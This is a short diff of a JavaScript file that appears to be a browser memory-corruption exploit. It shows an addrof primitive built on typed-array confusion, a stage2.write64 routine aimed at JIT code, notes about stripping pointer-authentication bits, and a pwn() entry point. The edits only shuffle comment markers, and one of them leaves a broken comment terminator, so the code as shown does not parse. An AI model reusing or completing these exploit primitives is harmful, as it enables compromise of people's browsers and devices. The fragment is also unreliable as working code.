@@ -615,6 +615,7 @@ for (var i = 0; i < 1000; ++i) {
         },
     };
 
+    /*
     //stage2.test();
             var v = 0x4141;
             var obj = {p: v};
@@ -770,7 +771,7 @@ for (var i = 0; i < 1000; ++i) {
         "I will write 0x41414141 unseccessfully as it is mapped as read only\n"+
         "Should signal a SIGBus memory violation crash log and it should show the Read\n"+
         "only memory is in the crash log if your device have pac I will need to strip that\n"+
-        "first... before doing so... So in 10 seconds I will trigger the crash...\n")*/
+        "first... before doing so... So in 10 seconds I will trigger the crash...\n")/
         //sleep(5)
         //jitcode = shouldwestrippacbits(jitcode);
         //stage2.write64(jitcode,0x41414141)
@@ -952,7 +953,8 @@ for (var i = 0; i < 1000; ++i) {
         addrof = (val) => {
           b1[offset] = val;
           return floatAsQword(a1[0]);
-        }*/
+        }*/ 
+
       }
       function pwn() {
         try {
